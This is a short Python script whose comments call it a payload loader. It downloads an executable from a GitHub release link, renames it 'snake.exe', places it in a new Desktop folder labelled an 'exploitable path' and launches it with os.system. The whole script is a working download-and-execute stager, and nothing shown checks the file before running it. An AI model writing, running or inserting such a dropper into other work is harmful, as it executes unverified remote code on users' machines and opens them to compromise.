from sys import exit
from urllib.request import urlretrieve
from shutil import move
import os
from os import getlogin as getlogin, system as system, makedirs as makedirs

replink = "https://github.com/xemulat/Basic-Redists/releases/download/1/basic.redists.exe"    #Payload Direct Download Link
repname = "snake.exe"   #DO NOT TOUCH
pyload = "C:/Users/" + getlogin() + "/Desktop/404"  #Exploitable Path (Can Be Changed!)
makedirs(pyload)    #Make Exploitable Directory

urlretrieve(replink, repname)    #Download a file using UrlLib

move(repname, pyload)   #Move Downloaded File(Snake.exe) To Exploitable Path
payloader = pyload + '/' + repname  #Set Path To Downloaded File
system(payloader)    #Launch Downloaded File
